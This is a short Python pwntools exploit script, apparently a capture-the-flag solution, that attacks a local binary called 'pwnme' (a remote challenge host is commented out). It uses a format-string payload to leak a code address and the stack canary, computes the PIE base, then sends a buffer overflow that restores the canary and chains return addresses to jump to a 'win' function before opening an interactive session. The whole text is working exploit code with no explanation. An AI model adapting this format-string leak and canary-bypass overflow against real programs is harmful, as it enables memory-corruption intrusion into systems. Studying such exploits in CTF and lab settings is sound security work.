from pwn import *
import re
p=process("./pwnme")
#p=remote("0.cloud.chals.io",20646)
elf=ELF("./pwnme")
resp1=p.recvrepeat(.1)
print(resp1)
p.sendline(b"%10$p ** %13$p @@")
resp=p.recvrepeat(.1)
leak = int(re.findall(b"[0-9a-f]{8,16}",resp)[0],16)
canary = int(re.findall(b"[0-9a-f]{8,16}",resp)[1],16)
print(hex(leak))
elf.address = leak - elf.sym._start
p.sendline(b"A"*0x18 + p64(canary) + b"JUNKJUNK" + p64(elf.address + 0x1383) + p64(0xdeadbeef) + p64(elf.address + 0x101a) + p64(elf.sym.win))
p.interactive()
